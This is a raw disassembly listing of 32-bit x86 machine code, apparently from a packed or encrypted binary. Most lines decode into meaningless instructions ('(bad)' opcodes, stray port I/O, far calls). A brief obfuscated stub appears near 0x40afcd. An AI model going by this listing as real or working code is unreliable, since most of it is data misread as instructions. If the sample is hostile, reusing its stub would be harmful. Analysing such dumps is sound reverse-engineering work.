  40aa77:	pop    ebp
  40aa78:	pop    ebp
  40aa79:	mov    edx,0x1ae1d127
  40aa7e:	pop    eax
  40aa7f:	ds ret 
  40aa81:	bound  edi,QWORD PTR [ebx+0x28508d96]
  40aa87:	push   0xf29a9b79
  40aa8c:	xchg   BYTE PTR [eax+0x1e],ch
  40aa8f:	mov    al,cs:0x250c0362
  40aa95:	adc    al,0xf2
  40aa97:	lahf   
  40aa98:	jp     0x40aacd
  40aa9a:	add    bh,BYTE PTR [esp+eiz*2+0x4b]
  40aa9e:	leave  
  40aa9f:	xlat   BYTE PTR ds:[ebx]
  40aaa0:	out    dx,al
  40aaa1:	adc    ebx,DWORD PTR [eax+ebx*1+0x20]
  40aaa5:	stos   DWORD PTR es:[edi],eax
  40aaa6:	sbb    ebx,esi
  40aaa8:	or     al,0x89
  40aaaa:	mov    DWORD PTR [edx],edx
  40aaac:	cmovo  ecx,DWORD PTR [ebp+0x51a67b8d]
  40aab3:	sub    ebp,edi
  40aab5:	scas   al,BYTE PTR es:[edi]
  40aab6:	or     BYTE PTR [esi],ah
  40aab8:	cmp    BYTE PTR [edi-0x17],ah
  40aabb:	jno    0x40aafa
  40aabd:	inc    eax
  40aabe:	test   bh,ah
  40aac0:	retf   
  40aac1:	test   edi,0xd87e46ac
  40aac7:	fst    QWORD PTR ds:0x30ce4637
  40aacd:	inc    esp
  40aace:	pop    ebx
  40aacf:	daa    
  40aad0:	adc    bh,ah
  40aad2:	pop    esp
  40aad3:	fidivr WORD PTR [eax+0x14a5226d]
  40aad9:	adc    BYTE PTR [ecx+edi*8+0x45c2ee8f],al
  40aae0:	mov    esp,0x5f240c16
  40aae5:	jl     0x40aa8e
  40aae7:	nop
  40aae8:	stc    
  40aae9:	inc    ebx
  40aaea:	std    
  40aaeb:	sbb    BYTE PTR [ecx-0x7f610106],ah
  40aaf1:	outs   dx,BYTE PTR ds:[esi]
  40aaf2:	cmp    al,0x8
  40aaf4:	add    bl,BYTE PTR [eax]
  40aaf6:	push   ss
  40aaf7:	add    eax,0xe3ad1047
  40aafc:	mov    al,ds:0x703d2693
  40ab01:	or     eax,0x61373ac9
  40ab06:	lock inc eax
  40ab08:	jle    0x40aadb
  40ab0a:	cs mov ebx,0x8b0004b7
  40ab10:	mov    edi,0xb747460d
  40ab15:	sbb    dl,BYTE PTR [ebp-0x35]
  40ab18:	jl     0x40ab43
  40ab1a:	stos   BYTE PTR es:[edi],al
  40ab1b:	imul   eax,edi,0x42
  40ab1e:	xchg   ebx,eax
  40ab1f:	sub    eax,0x86e3c070
  40ab24:	cmp    eax,0x21c1172b
  40ab29:	in     eax,dx
  40ab2a:	ins    BYTE PTR es:[edi],dx
  40ab2b:	imul   ebp,DWORD PTR [edi+eiz*4],0xffffffd4
  40ab2f:	div    BYTE PTR [ebp+0x2c]
  40ab32:	ret    0xf6ae
  40ab35:	mov    bh,bl
  40ab37:	stos   BYTE PTR es:[edi],al
  40ab38:	rcl    BYTE PTR [ebp-0xd1beab7],0x48
  40ab3f:	jge    0x40ab93
  40ab41:	inc    esp
  40ab42:	and    eax,0x7120792a
  40ab47:	fldenv fs:[eax-0x11b0c9f9]
  40ab4e:	mov    ch,0xaf
  40ab50:	lods   al,BYTE PTR ds:[esi]
  40ab51:	jle    0x40aad5
  40ab53:	call   FWORD PTR [ebx+0x7971e1e4]
  40ab59:	cli    
  40ab5a:	mov    al,0x91
  40ab5c:	pop    ecx
  40ab5d:	popa   
  40ab5e:	push   es
  40ab5f:	sti    
  40ab60:	sub    BYTE PTR [esp],cl
  40ab63:	mov    edx,0x51401352
  40ab68:	mov    edx,0x2ec38222
  40ab6d:	mov    eax,DWORD PTR [eax-0x11e53345]
  40ab73:	(bad)  
  40ab74:	mov    al,0x80
  40ab76:	mov    al,ds:0xd2ecab48
  40ab7b:	and    DWORD PTR [edi],esi
  40ab7d:	and    DWORD PTR [esi+0x79],0x22
  40ab81:	sbb    ebp,DWORD PTR [edi-0x50]
  40ab84:	mov    eax,DWORD PTR ds:0xee83847
  40ab8a:	sbb    ecx,DWORD PTR [ecx-0x52]
  40ab8d:	out    dx,eax
  40ab8e:	mov    gs,WORD PTR [ebx-0x5a]
  40ab91:	outs   dx,DWORD PTR ds:[esi]
  40ab92:	cs push esp
  40ab94:	adc    DWORD PTR [ecx],ecx
  40ab96:	mov    ch,0x38
  40ab98:	push   ebp
  40ab99:	fcom   st(7)
  40ab9b:	jnp    0x40ab73
  40ab9d:	leave  
  40ab9e:	pusha  
  40ab9f:	or     bl,BYTE PTR [edx+0x54]
  40aba2:	jne    0x40ab67
  40aba4:	aam    0x49
  40aba6:	xchg   ebx,eax
  40aba7:	out    dx,al
  40aba8:	sub    BYTE PTR [edx+0x1cb9accd],ch
  40abae:	cmp    BYTE PTR [ecx+0x7],ch
  40abb1:	sahf   
  40abb2:	sbb    DWORD PTR cs:[edx+0x4cec2d5f],ecx
  40abb9:	sub    edx,DWORD PTR [eax-0x57]
  40abbc:	loopne 0x40ab51
  40abbe:	jmp    0x40ab62
  40abc0:	call   0x33cb:0x52de21f9
  40abc7:	fdiv   DWORD PTR [ebp+0x6]
  40abca:	mov    cl,0x6e
  40abcc:	mov    ds:0x64736558,eax
  40abd1:	adc    al,0x7c
  40abd3:	lea    esi,[esi+0xc]
  40abd6:	popf   
  40abd7:	xor    al,0xc6
  40abd9:	mov    ah,0xed
  40abdb:	shr    DWORD PTR [ebp-0x62c23c4e],0x82
  40abe2:	jl     0x40ab66
  40abe4:	ret    0x2234
  40abe7:	shr    DWORD PTR [edi],0x33
  40abea:	sbb    edi,ebx
  40abec:	aad    0x4e
  40abee:	inc    edx
  40abef:	pop    ecx
  40abf0:	inc    esi
  40abf1:	cdq    
  40abf2:	mov    edi,ebp
  40abf4:	and    BYTE PTR [eax+0x77a9a0dd],dl
  40abfa:	mov    ah,0x3f
  40abfc:	dec    edi
  40abfd:	in     eax,dx
  40abfe:	pushf  
  40abff:	xchg   ebx,eax
  40ac00:	mov    ebx,0x233f93d
  40ac05:	add    al,0xa7
  40ac07:	adc    ch,BYTE PTR [ebx]
  40ac09:	pop    esi
  40ac0a:	cwde   
  40ac0b:	xor    al,0x3f
  40ac0d:	sbb    eax,DWORD PTR [ecx+0x2ff65d44]
  40ac13:	and    BYTE PTR [ebx+0x212ceb34],0x85
  40ac1a:	into   
  40ac1b:	xor    edi,DWORD PTR [esi+0x20]
  40ac1e:	pop    es
  40ac1f:	call   0x330a2463
  40ac24:	push   ebp
  40ac25:	sbb    BYTE PTR [ebx-0x3c],0x78
  40ac29:	mov    bh,BYTE PTR [esi]
  40ac2b:	jae    0x40ac82
  40ac2d:	jmp    DWORD PTR [esi]
  40ac2f:	rcr    ecx,0xdd
  40ac32:	mov    ch,BYTE PTR [ecx-0x5ba77169]
  40ac38:	bound  ebp,QWORD PTR [ebp+0x11]
  40ac3b:	(bad)  
  40ac3c:	fadd   DWORD PTR [edi]
  40ac3e:	leave  
  40ac3f:	mov    dh,0xcd
  40ac41:	xor    eax,0x468ea157
  40ac46:	push   edi
  40ac47:	test   DWORD PTR [ebp+0x63a58010],ecx
  40ac4d:	ss inc ebp
  40ac4f:	push   es
  40ac50:	mov    edi,0xb6b9f331
  40ac55:	inc    ecx
  40ac56:	push   ss
  40ac57:	mov    gs,WORD PTR [esi]
  40ac59:	mov    eax,0xb44fac93
  40ac5e:	nop
  40ac5f:	mov    WORD PTR [edi+0x3b],fs
  40ac62:	je     0x40ac1a
  40ac64:	and    ch,BYTE PTR [ebp+0x34e75b68]
  40ac6a:	and    ecx,edx
  40ac6c:	push   0x69
  40ac6e:	push   ecx
  40ac6f:	push   esi
  40ac70:	sti    
  40ac71:	cld    
  40ac72:	fwait
  40ac73:	inc    esi
  40ac74:	push   0xac0f3717
  40ac79:	imul   BYTE PTR [edx+0x849bf34]
  40ac7f:	jle    0x40acda
  40ac81:	or     al,0x4d
  40ac83:	and    esi,DWORD PTR [esi-0x3957d9f3]
  40ac89:	mov    ch,0x61
  40ac8b:	stos   BYTE PTR es:[edi],al
  40ac8c:	sbb    esi,DWORD PTR [eax]
  40ac8e:	icebp  
  40ac8f:	pop    ds
  40ac90:	fmul   st,st(2)
  40ac92:	test   DWORD PTR [edi+eax*1-0x28fa0d2d],esp
  40ac99:	or     bh,ch
  40ac9b:	daa    
  40ac9c:	enter  0x25e3,0xee
  40aca0:	ret    0xb32a
  40aca3:	je     0x40ac76
  40aca5:	dec    esi
  40aca6:	mov    al,0x57
  40aca8:	push   edi
  40aca9:	sub    edx,ebx
  40acab:	push   0x46
  40acad:	or     dl,BYTE PTR [eax]
  40acaf:	xor    eax,DWORD PTR [ebp-0x19af2b78]
  40acb5:	or     DWORD PTR [ebx+0x1a6d01b],edx
  40acbb:	push   esi
  40acbc:	xor    al,0x9e
  40acbe:	jmp    0x37068bf0
  40acc3:	(bad)  
  40acc4:	jmp    0x1b72b984
  40acc9:	test   eax,0x69e63dc
  40acce:	ins    DWORD PTR es:[edi],dx
  40accf:	into   
  40acd0:	into   
  40acd1:	pop    ds
  40acd2:	xchg   edx,eax
  40acd3:	push   0xe0556a7b
  40acd8:	push   edx
  40acd9:	cwde   
  40acda:	jg     0x40acfa
  40acdc:	imul   ebx,DWORD PTR ds:0xd32a8c2c,0x359f7384
  40ace6:	dec    esp
  40ace7:	jns    0x40aca4
  40ace9:	or     edx,DWORD PTR [ecx+ebx*8+0x32f47d4e]
  40acf0:	adc    al,0x52
  40acf2:	das    
  40acf3:	in     al,0x58
  40acf5:	mov    ds:0xa216c7f8,al
  40acfa:	out    0xc5,al
  40acfc:	pop    ecx
  40acfd:	sti    
  40acfe:	mov    esi,0x28eec2b9
  40ad03:	shl    BYTE PTR [ecx],cl
  40ad05:	pushf  
  40ad06:	mov    ds:0x177147b0,al
  40ad0b:	in     al,dx
  40ad0c:	cld    
  40ad0d:	sub    bh,al
  40ad0f:	mov    eax,0xc8a6569e
  40ad14:	in     al,0x87
  40ad16:	addr16 jmp 0x40ad50
  40ad19:	ins    BYTE PTR es:[edi],dx
  40ad1a:	test   al,0xf
  40ad1c:	adc    ecx,DWORD PTR [esi]
  40ad1e:	inc    eax
  40ad1f:	xchg   esp,eax
  40ad20:	sbb    edi,DWORD PTR [eax]
  40ad22:	pop    ds
  40ad23:	fcmovnbe st,st(2)
  40ad25:	test   BYTE PTR ds:0x385a802e,0xb7
  40ad2c:	dec    esp
  40ad2d:	mov    edi,0xc63d9fe1
  40ad32:	lock xor eax,0xf31ac6c1
  40ad38:	cmp    al,0x28
  40ad3a:	daa    
  40ad3b:	and    BYTE PTR [ecx-0x1],bh
  40ad3e:	cs mov ebp,ebx
  40ad41:	outs   dx,DWORD PTR ds:[esi]
  40ad42:	ins    BYTE PTR es:[edi],dx
  40ad43:	inc    eax
  40ad44:	mov    es,WORD PTR [edi]
  40ad46:	add    ecx,DWORD PTR [esi-0x3fe580d5]
  40ad4c:	test   al,0x63
  40ad4e:	shl    DWORD PTR [ecx],1
  40ad50:	adc    bl,bl
  40ad52:	and    al,0x3e
  40ad54:	clc    
  40ad55:	xchg   edx,eax
  40ad56:	push   0xffffff85
  40ad58:	jmp    0x40ad5f
  40ad5a:	imul   esi,DWORD PTR [ecx],0xfffffff6
  40ad5d:	push   ds
  40ad5e:	ins    DWORD PTR es:[edi],dx
  40ad5f:	pop    ecx
  40ad60:	xchg   ecx,eax
  40ad61:	mov    dh,BYTE PTR [eax+0x482a6aa5]
  40ad67:	out    dx,al
  40ad68:	cmc    
  40ad69:	mov    bh,dl
  40ad6b:	xor    BYTE PTR [esi],ah
  40ad6d:	shl    DWORD PTR [esi+0x11],cl
  40ad70:	aad    0x91
  40ad72:	fidiv  DWORD PTR [edx]
  40ad75:	shr    BYTE PTR [ecx],cl
  40ad77:	fld    QWORD PTR [edx+0x17248a3]
  40ad7d:	ror    DWORD PTR [esp+edx*1+0x7a],1
  40ad81:	xchg   ebx,eax
  40ad82:	and    DWORD PTR [edx],edx
  40ad84:	scas   eax,DWORD PTR es:[edi]
  40ad85:	imul   ebp,DWORD PTR [eax-0x53d2bf70],0x2a
  40ad8c:	imul   BYTE PTR [ebx+0x69248971]
  40ad92:	bound  edx,QWORD PTR [eax+eax*1]
  40ad95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad96:	cdq    
  40ad97:	adc    BYTE PTR [esi+0x2f],bh
  40ad9a:	fidiv  WORD PTR [esp+eiz*4]
  40ad9d:	mov    ds:0x5e618c9c,al
  40ada2:	aaa    
  40ada3:	sbb    eax,0x2f43c4f7
  40ada8:	dec    esp
  40ada9:	push   edi
  40adaa:	rol    DWORD PTR [ebx-0x63f78915],1
  40adb0:	dec    edx
  40adb1:	jb     0x40adff
  40adb3:	stos   BYTE PTR es:[edi],al
  40adb4:	xor    al,0x54
  40adb6:	ds imul ebp,esp,0x87b35db4
  40adbd:	repnz iret 
  40adbf:	push   0x38bcb306
  40adc4:	xor    DWORD PTR gs:[esi],esi
  40adc7:	int3   
  40adc8:	mov    ebp,0x6295e145
  40adcd:	out    dx,eax
  40adce:	aam    0xd7
  40add0:	pop    esi
  40add1:	xor    BYTE PTR [ecx-0x26497ea1],bh
  40add7:	test   DWORD PTR [edx-0x10bd00c7],ecx
  40addd:	mov    bl,0x5b
  40addf:	loope  0x40ade7
  40ade1:	test   eax,0xad6cf953
  40ade6:	add    al,0xd3
  40ade8:	xchg   ecx,eax
  40ade9:	xor    eax,DWORD PTR [edi+0x50210aaa]
  40adef:	jne    0x40adc1
  40adf1:	in     al,0xe9
  40adf3:	inc    ecx
  40adf4:	outs   dx,DWORD PTR ds:[esi]
  40adf5:	mov    eax,0x3ae0ca53
  40adfb:	cld    
  40adfc:	fstp   QWORD PTR [edi-0x1d]
  40adff:	popf   
  40ae00:	into   
  40ae01:	clc    
  40ae02:	pop    es
  40ae03:	xor    ecx,ebp
  40ae05:	pusha  
  40ae06:	aad    0x99
  40ae08:	daa    
  40ae09:	data16 mov ah,0xc8
  40ae0c:	inc    edx
  40ae0d:	in     eax,0xa1
  40ae0f:	movzx  edi,cx
  40ae12:	cmp    dh,0x8c
  40ae15:	test   esi,ebp
  40ae17:	inc    esp
  40ae18:	xchg   DWORD PTR [esi+0x41],esp
  40ae1b:	xor    DWORD PTR [edx],edx
  40ae1d:	and    BYTE PTR [ebx],bl
  40ae1f:	sbb    al,0xf7
  40ae21:	sbb    bh,BYTE PTR [ebp-0x4e]
  40ae24:	mov    esp,0x27288d44
  40ae29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae2a:	cmp    DWORD PTR [edi+ebp*1+0x5f],edx
  40ae2e:	scas   eax,DWORD PTR es:[edi]
  40ae2f:	ret    
  40ae30:	fs jo  0x40ae56
  40ae33:	inc    esi
  40ae34:	in     eax,dx
  40ae35:	mov    ds:0x6f6c2918,eax
  40ae3a:	cmp    al,0x62
  40ae3c:	rcr    BYTE PTR [eax+0x23949e24],cl
  40ae42:	cld    
  40ae43:	jne    0x40ae68
  40ae45:	jle    0x40adea
  40ae47:	jo     0x40ae4b
  40ae49:	add    bl,BYTE PTR [edi+0x2f]
  40ae4c:	inc    esi
  40ae4d:	lock push cs
  40ae4f:	inc    ebp
  40ae50:	mov    DWORD PTR [ecx],0x6bf78770
  40ae56:	jae    0x40ae35
  40ae58:	das    
  40ae59:	add    DWORD PTR [ebx-0x27],ecx
  40ae5c:	pop    ecx
  40ae5d:	lock mov ecx,0x3af7c1d3
  40ae63:	mov    esi,0x2f04edfa
  40ae68:	pop    esp
  40ae69:	sub    ebp,DWORD PTR [ebx-0x35]
  40ae6c:	fsubr  QWORD PTR [ebx]
  40ae6e:	jbe    0x40ae49
  40ae70:	xchg   ebp,eax
  40ae71:	fld    TBYTE PTR [edx-0x4d]
  40ae74:	dec    esi
  40ae75:	imul   edi,DWORD PTR [ebp+0x33],0x6f
  40ae79:	mov    edx,DWORD PTR ss:[edx-0x69f47248]
  40ae80:	mov    al,0x71
  40ae82:	jmp    0x40ae58
  40ae84:	pusha  
  40ae85:	mov    esp,0xd27703e1
  40ae8a:	into   
  40ae8b:	scas   al,BYTE PTR es:[edi]
  40ae8c:	pop    ss
  40ae8d:	push   0x3d
  40ae8f:	jmp    0xe548:0xa1d690fa
  40ae96:	push   0x1cf4a6d7
  40ae9b:	outs   dx,DWORD PTR ds:[esi]
  40ae9c:	push   0x9296b9da
  40aea1:	jp     0x40ae9b
  40aea3:	ja     0x40ae61
  40aea5:	xor    ah,cl
  40aea7:	test   BYTE PTR [ecx+0x2dc70c46],ch
  40aead:	icebp  
  40aeae:	sahf   
  40aeaf:	cmp    al,0x75
  40aeb1:	les    esp,FWORD PTR [esi+edi*8-0x73]
  40aeb5:	mov    dl,0xc6
  40aeb7:	jno    0x40ae4e
  40aeb9:	in     eax,0x7f
  40aebb:	lods   al,BYTE PTR ds:[esi]
  40aebc:	pop    eax
  40aebd:	jo     0x40ae46
  40aebf:	inc    esp
  40aec0:	ja     0x40aea9
  40aec2:	push   esi
  40aec3:	mov    esp,0x37af5759
  40aec8:	jnp    0x40aeab
  40aeca:	loopne 0x40af00
  40aecc:	pop    edx
  40aecd:	loope  0x40ae7c
  40aecf:	(bad)  
  40aed1:	(bad)  
  40aed2:	jae    0x40af02
  40aed4:	xor    eax,ebp
  40aed6:	adc    al,cl
  40aed8:	xchg   ebp,eax
  40aed9:	rcl    DWORD PTR [ebp-0x4e],cl
  40aedc:	sahf   
  40aedd:	imul   esi,DWORD PTR [edx+edi*2-0x55],0x360b28d2
  40aee5:	and    eax,0x312085b2
  40aeea:	xor    eax,0x698927fb
  40aeef:	inc    ebx
  40aef0:	fistp  QWORD PTR [edi]
  40aef2:	shr    BYTE PTR es:[esp+eiz*2+0x27c97398],1
  40aefa:	push   esp
  40aefb:	push   eax
  40aefc:	fdiv   QWORD PTR [eax]
  40aefe:	icebp  
  40aeff:	adc    eax,0x49a9db5
  40af04:	fimul  DWORD PTR [esi]
  40af06:	mov    al,ds:0x992965ca
  40af0b:	mov    WORD PTR [edi-0x6f],?
  40af0e:	(bad)  
  40af0f:	in     eax,dx
  40af10:	pop    edi
  40af11:	jb     0x40aeed
  40af13:	mov    edi,eax
  40af15:	in     eax,dx
  40af16:	add    BYTE PTR fs:[ecx+0x61f5efea],bh
  40af1d:	std    
  40af1e:	in     al,dx
  40af1f:	leave  
  40af20:	sti    
  40af21:	cmp    ch,BYTE PTR [edi+0x6066a226]
  40af27:	mov    ah,0x68
  40af29:	jb     0x40aede
  40af2b:	cs repz aam 0x66
  40af2f:	xor    esp,eax
  40af31:	bound  esp,QWORD PTR [ebp-0x6c484e6c]
  40af37:	mov    al,0x56
  40af39:	mov    ebp,0x8b947737
  40af3e:	pusha  
  40af3f:	lahf   
  40af40:	test   al,0x4b
  40af42:	cmp    al,0xd6
  40af44:	addr16 jo 0x40af75
  40af47:	cli    
  40af48:	retf   
  40af49:	jecxz  0x40aee9
  40af4b:	pop    ss
  40af4c:	gs inc ebx
  40af4e:	dec    esi
  40af4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af50:	mov    eax,0xe6b18c57
  40af55:	or     al,BYTE PTR [eax-0x1447805a]
  40af5b:	aaa    
  40af5c:	cmp    eax,edx
  40af5e:	ins    DWORD PTR es:[edi],dx
  40af5f:	daa    
  40af60:	test   al,0x38
  40af62:	repz test BYTE PTR [eax],dl
  40af65:	jbe    0x40af1a
  40af67:	mov    esp,0xb2c7d82e
  40af6c:	cmp    ecx,DWORD PTR [edi-0x329c221c]
  40af72:	add    ah,0xbc
  40af75:	push   cs
  40af76:	in     al,0xd4
  40af78:	inc    ebx
  40af79:	mov    BYTE PTR [edx+0x2f],0xd5
  40af7d:	aam    0x72
  40af7f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40af81:	sbb    ebp,DWORD PTR [edx]
  40af83:	inc    eax
  40af84:	fs out dx,al
  40af86:	iret   
  40af87:	out    dx,al
  40af88:	xor    DWORD PTR [ecx+0x63394333],0xdf2df401
  40af92:	in     eax,dx
  40af93:	cmp    al,BYTE PTR [edx-0x4f]
  40af96:	jge    0x40af90
  40af98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af99:	adc    BYTE PTR [edx+0xb442a04],dl
  40af9f:	push   0x15
  40afa1:	ds out dx,al
  40afa3:	cmc    
  40afa4:	bound  edi,QWORD PTR [ebx-0x6c16015a]
  40afaa:	add    cl,BYTE PTR [esi]
  40afac:	sub    cl,BYTE PTR [ecx]
  40afae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afaf:	cs jbe 0x40b000
  40afb2:	(bad)  
  40afb3:	stc    
  40afb4:	mov    ch,0x8d
  40afb6:	scas   al,BYTE PTR es:[edi]
  40afb7:	xchg   edx,eax
  40afb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afb9:	or     ah,BYTE PTR [ebp-0x64f82139]
  40afbf:	or     ebp,ecx
  40afc1:	pusha  
  40afc2:	test   DWORD PTR [ebx-0x7c],esp
  40afc5:	call   0x4241:0x63f10774
  40afcc:	dec    ecx
  40afcd:	mov    eax,DWORD PTR [ebp-0x4]
  40afd0:	xor    eax,esi
  40afd2:	add    eax,edi
  40afd4:	mov    DWORD PTR [ebp-0x10],eax
  40afd7:	mov    ebx,0x65655
  40afdc:	add    ebx,0x3234
  40afe2:	xchg   ebx,esi
  40afe4:	xor    ebx,ebx
  40afe6:	push   esi
  40afe7:	mov    esi,ebx
  40afe9:	pop    ebx
  40afea:	mov    edx,esi
  40afec:	jmp    0x40d37e
  40aff1:	cli    
  40aff2:	mov    DWORD PTR [ecx-0x65b47dad],esi
  40aff8:	add    BYTE PTR ds:0xc429b0d0,0xf5
  40afff:	nop
  40b000:	mov    ah,0x29
  40b002:	hlt    
  40b003:	add    DWORD PTR [ebx-0x7c7ca1f4],0x48
  40b00a:	mov    ebp,0x66a1d8b5
  40b00f:	lahf   
  40b010:	mov    cs,WORD PTR [esi+0x7a]
  40b013:	sbb    DWORD PTR [ebp-0xc],ecx
  40b016:	sub    al,0x30
  40b018:	neg    ecx
  40b01a:	data16 jp 0x40b066
  40b01d:	loop   0x40afbd
  40b01f:	dec    ebx
  40b020:	or     DWORD PTR [edi+0x63],edx
  40b023:	iret   
  40b024:	inc    eax
  40b025:	scas   al,BYTE PTR es:[edi]
  40b026:	popa   
  40b027:	fisubr WORD PTR [esi]
  40b029:	test   BYTE PTR [esi],dl
  40b02b:	pop    es
  40b02c:	dec    ebp
  40b02d:	push   edx
  40b02e:	leave  
  40b02f:	push   ds
  40b030:	in     al,0x7d
  40b032:	mov    DWORD PTR [esp+edi*2],0x8f851bb
  40b039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b03a:	xchg   cl,ch
  40b03c:	into   
  40b03d:	int    0x78
  40b03f:	pop    ss
  40b040:	and    BYTE PTR [edx-0x22406780],cl
  40b046:	and    al,0xa6
  40b048:	fistp  WORD PTR [ecx+eiz*1]
  40b04b:	mov    edx,0xea72a59
  40b050:	xchg   esi,eax
  40b051:	int3   
  40b052:	sbb    eax,DWORD PTR [esi]
  40b054:	cld    
  40b055:	out    dx,al
  40b056:	jle    0x40b03e
  40b058:	in     eax,dx
  40b059:	mov    dh,0x42
  40b05b:	jb     0x40b0c5
  40b05d:	mov    bh,0x8e
  40b05f:	push   0xaa906f60
  40b064:	ds inc edx
  40b066:	js     0x40b085
  40b068:	pop    ecx
  40b069:	jp     0x40b038
  40b06b:	out    dx,al
  40b06c:	das    
  40b06d:	mov    ss,edx
  40b06f:	mov    esi,DWORD PTR [esi-0x411e06df]
  40b075:	mov    ebp,0xb1da5c0
  40b07a:	test   al,0xb5
  40b07c:	daa    
  40b07d:	jns    0x40b097
  40b07f:	xor    bh,cl
  40b081:	lahf   
  40b082:	(bad)  
  40b083:	clc    
  40b084:	pushf  
  40b085:	addr16 jo 0x40b056
  40b088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b089:	out    0x59,al
  40b08b:	aam    0xaf
  40b08d:	mov    ah,0x8
  40b08f:	hlt    
  40b090:	mov    dh,BYTE PTR [ebp-0xad51fe2]
  40b096:	sbb    edi,DWORD PTR [esi+0x2359388d]
  40b09c:	mov    bh,0x7e
  40b09e:	jl     0x40b0f2
  40b0a0:	inc    esp
  40b0a1:	and    al,0xa9
  40b0a3:	and    eax,0x36cd8d6b
  40b0a8:	sbb    bp,bx
  40b0ab:	pop    esi
  40b0ac:	mov    bl,0xe0
  40b0ae:	(bad)  
  40b0af:	sbb    dl,ah
  40b0b1:	jno    0x40b075
  40b0b3:	fcomp  DWORD PTR [edi-0x1595649b]
  40b0b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0ba:	div    DWORD PTR [edi]
  40b0bc:	rol    DWORD PTR [edx],0xac
  40b0bf:	shr    BYTE PTR [ebx+0x370730d7],1
  40b0c5:	call   0xaa433e0c
  40b0ca:	pop    ss
  40b0cb:	jle    0x40b12b
  40b0cd:	and    dl,BYTE PTR [esi-0x4348d7dd]
  40b0d3:	mov    DWORD PTR [bp+si-0x4a],ebp
  40b0d7:	call   0x78b:0xcaa186f1
  40b0de:	popf   
  40b0df:	jmp    0x57ec59c7
  40b0e4:	(bad)  
  40b0e5:	dec    DWORD PTR [edi+0x4b]
  40b0e8:	jnp    0x40b076
  40b0ea:	clc    
  40b0eb:	gs out dx,al
  40b0ed:	repnz and al,bh
  40b0f0:	mov    bl,0xea
  40b0f2:	call   0x90fa:0x2cb89a91
  40b0f9:	in     al,dx
  40b0fa:	rcr    BYTE PTR [ebp-0x7a],1
  40b0fd:	pop    es
  40b0fe:	scas   al,BYTE PTR es:[edi]
  40b0ff:	ret    
  40b100:	sahf   
  40b101:	fdivr  DWORD PTR [eax]
  40b103:	fisubr WORD PTR [edx-0x7c]
  40b106:	les    ebx,FWORD PTR [ebx+0x40b459ac]
  40b10c:	cmp    eax,0xf531055a
  40b111:	mov    esp,0x686e7ba9
  40b116:	mov    BYTE PTR [edi],ah
  40b118:	xchg   DWORD PTR [eax+0x4fdf0086],eax
  40b11e:	out    0x62,eax
  40b120:	not    DWORD PTR [ebp-0x6aed3b38]
  40b126:	xchg   edi,eax
  40b127:	outs   dx,DWORD PTR ds:[esi]
  40b128:	xor    DWORD PTR [eax],0xce67d22f
  40b12e:	inc    eax
  40b12f:	xchg   DWORD PTR [ebx],esi
  40b131:	xchg   BYTE PTR [edx-0x31f8baf3],ch
  40b137:	jp     0x40b0fa
  40b139:	jl     0x40b0c7
  40b13b:	ins    BYTE PTR es:[edi],dx
  40b13c:	dec    edx
  40b13d:	call   0x11f6:0x10c26062
  40b144:	enter  0xd720,0xc6
  40b148:	loop   0x40b16c
  40b14a:	xchg   ebp,eax
  40b14b:	inc    edi
  40b14c:	inc    esi
  40b14d:	mov    ecx,0x5b50ece1
  40b152:	popf   
  40b153:	mov    ch,BYTE PTR [ebx]
  40b155:	aas    
  40b156:	retf   
  40b157:	das    
  40b158:	mov    al,al
  40b15a:	or     eax,0x1ec0a14b
  40b15f:	(bad)  
  40b161:	aas    
  40b162:	std    
  40b163:	aam    0x43
  40b165:	test   edi,ebp
  40b167:	push   eax
  40b168:	jmp    0xd6b4:0x4b2645e
  40b16f:	(bad)  
  40b170:	mul    BYTE PTR [esp+edx*2]
  40b173:	pop    esi
  40b174:	mov    edi,0xa7a60c87
  40b179:	and    al,0xe1
  40b17b:	call   0xc37d025e
  40b180:	test   eax,0x81da3eba
  40b185:	das    
  40b186:	pusha  
  40b187:	int    0xfc
  40b189:	std    
  40b18a:	sub    eax,0x15bb46cc
  40b18f:	adc    BYTE PTR [edx],0xce
  40b192:	(bad)  
  40b193:	sub    ah,ah
  40b195:	mov    ch,0xbf
  40b197:	mov    ebx,0x7a949a88
  40b19c:	xor    eax,0x9b7ac899
  40b1a1:	nop
  40b1a2:	rol    BYTE PTR [edx+0x1c],cl
  40b1a5:	push   ss
  40b1a6:	outs   dx,BYTE PTR ds:[esi]
  40b1a7:	jmp    0x40b20a
  40b1a9:	hlt    
  40b1aa:	xor    eax,0x565a6e4f
  40b1af:	stc    
  40b1b0:	leave  
  40b1b1:	mov    edx,0x60755fb6
  40b1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1b8:	cmp    edx,DWORD PTR [ebp-0x1]
  40b1bb:	mov    esi,0x7942c671
  40b1c0:	sbb    al,0x5b
  40b1c2:	mov    ebx,DWORD PTR [edx-0x5505e519]
  40b1c8:	and    eax,0x3047c5da
  40b1cd:	enter  0x34c8,0xd7
  40b1d1:	fs xchg ebp,eax
  40b1d3:	dec    edx
  40b1d4:	mov    ebp,DWORD PTR [eax]
  40b1d6:	jl     0x40b1a2
  40b1d8:	pop    ss
  40b1d9:	iret   
  40b1da:	ret    0xf702
  40b1dd:	mov    esi,0x82ad8a42
  40b1e2:	push   ebx
  40b1e3:	into   
  40b1e4:	pop    esp
  40b1e5:	adc    eax,0x670ad45
  40b1ea:	inc    edi
  40b1eb:	xchg   ah,ah
  40b1ed:	scas   eax,DWORD PTR es:[edi]
  40b1ee:	inc    ebx
  40b1ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1f0:	fmul   st(6),st
  40b1f2:	mov    ebx,0xdf352afa
  40b1f7:	das    
  40b1f8:	sub    ah,bl
  40b1fa:	xlat   BYTE PTR ds:[ebx]
  40b1fb:	jg     0x40b1cf
  40b1fd:	and    BYTE PTR [edx*8+0x312d1e9],cl
  40b204:	mov    ?,WORD PTR [edx]
  40b206:	fmul   DWORD PTR [ebp+ebx*4-0x565110e4]
